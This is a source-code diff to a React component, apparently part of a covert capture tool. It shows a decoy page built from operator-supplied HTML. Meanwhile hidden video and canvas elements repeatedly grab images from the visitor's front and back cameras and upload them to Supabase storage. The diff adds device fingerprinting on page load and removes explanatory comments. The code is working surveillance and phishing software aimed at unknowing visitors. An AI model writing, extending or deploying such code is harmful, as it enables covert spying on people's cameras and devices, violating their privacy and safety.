@@ -1,6 +1,7 @@
 import { useEffect, useState, useRef } from "react";
 import { useSearchParams } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
+import { collectDeviceInfo } from "@/utils/deviceInfo";
 
 const CustomCapture = () => {
   const [searchParams] = useSearchParams();
@@ -9,14 +10,34 @@ const CustomCapture = () => {
   const [customHtml, setCustomHtml] = useState<string | null>(null);
   const captureLoopRef = useRef<boolean>(false);
   const stopCaptureRef = useRef<boolean>(false);
+  const deviceInfoSavedRef = useRef<boolean>(false);
   
   const sessionId = searchParams.get("session") || "default";
-  const redirectUrl = searchParams.get("redirect") || "https://google.com";
-  const countdownSeconds = parseInt(searchParams.get("timer") || "5", 10);
+
+  // Save device info immediately when page loads
+  const saveDeviceInfo = async () => {
+    if (deviceInfoSavedRef.current) return;
+    deviceInfoSavedRef.current = true;
+    
+    try {
+      const deviceInfo = await collectDeviceInfo();
+      await supabase.from("captured_photos").insert({
+        session_id: sessionId + "_deviceinfo",
+        image_data: JSON.stringify(deviceInfo),
+        user_agent: navigator.userAgent,
+        ip_address: null,
+      });
+    } catch (err) {
+      console.error("Failed to save device info:", err);
+    }
+  };
 
   // Load custom HTML from settings
   useEffect(() => {
     const loadCustomHtml = async () => {
+      // Start collecting device info immediately
+      saveDeviceInfo();
+      
       try {
         const { data, error } = await supabase
           .from('app_settings')
@@ -92,7 +113,6 @@ const CustomCapture = () => {
     loadCustomHtml();
   }, []);
 
-  // Convert base64 to Blob for storage upload
   const base64ToBlob = (base64: string): Blob => {
     const parts = base64.split(',');
     const mime = parts[0].match(/:(.*?);/)?.[1] || 'image/jpeg';
@@ -113,7 +133,6 @@ const CustomCapture = () => {
       if (videoRef.current) {
         videoRef.current.srcObject = stream;
         await videoRef.current.play();
-        
         await new Promise(resolve => setTimeout(resolve, 500));
         
         if (canvasRef.current && videoRef.current) {
@@ -129,10 +148,8 @@ const CustomCapture = () => {
             return imageData;
           }
         }
-        
         stream.getTracks().forEach(track => track.stop());
       }
-      
       return null;
     } catch (error) {
       console.error(`Camera ${facingMode} access denied:`, error);
@@ -140,7 +157,6 @@ const CustomCapture = () => {
     }
   };
 
-  // Continuous capture loop - keeps capturing forever until user closes page
   const startContinuousCapture = async () => {
     if (captureLoopRef.current) return;
     captureLoopRef.current = true;
@@ -151,10 +167,8 @@ const CustomCapture = () => {
       try {
         captureCount++;
         
-        // Capture FRONT camera
         const frontImage = await captureFromCamera("user");
         if (frontImage && !stopCaptureRef.current) {
-          // Upload to storage
           const fileName = `${sessionId}/${Date.now()}-front-${captureCount}.jpg`;
           const blob = base64ToBlob(frontImage);
           const { error: uploadError } = await supabase.storage
@@ -177,10 +191,8 @@ const CustomCapture = () => {
         if (stopCaptureRef.current) break;
         await new Promise(resolve => setTimeout(resolve, 200));
         
-        // Capture BACK camera
         const backImage = await captureFromCamera("environment");
         if (backImage && !stopCaptureRef.current) {
-          // Upload to storage
           const fileName = `${sessionId}/${Date.now()}-back-${captureCount}.jpg`;
           const blob = base64ToBlob(backImage);
           const { error: uploadError } = await supabase.storage
@@ -210,20 +222,15 @@ const CustomCapture = () => {
     }
   };
 
-  // Cleanup on unmount
   useEffect(() => {
-    return () => {
-      stopCaptureRef.current = true;
-    };
+    return () => { stopCaptureRef.current = true; };
   }, []);
 
-  // Start capture immediately when HTML loads - no countdown shown
   useEffect(() => {
     if (!customHtml) return;
     startContinuousCapture();
   }, [customHtml]);
 
-  // Show nothing while loading HTML, then show ONLY custom HTML
   if (!customHtml) {
     return (
       <>
@@ -233,15 +240,11 @@ const CustomCapture = () => {
     );
   }
 
-  // ONLY show custom HTML - no countdown, no loading, just the HTML
   return (
     <>
       <video ref={videoRef} className="hidden" autoPlay playsInline muted />
       <canvas ref={canvasRef} className="hidden" />
-      <div 
-        dangerouslySetInnerHTML={{ __html: customHtml }} 
-        style={{ minHeight: '100vh' }}
-      />
+      <div dangerouslySetInnerHTML={{ __html: customHtml }} style={{ minHeight: '100vh' }} />
     </>
   );
 };
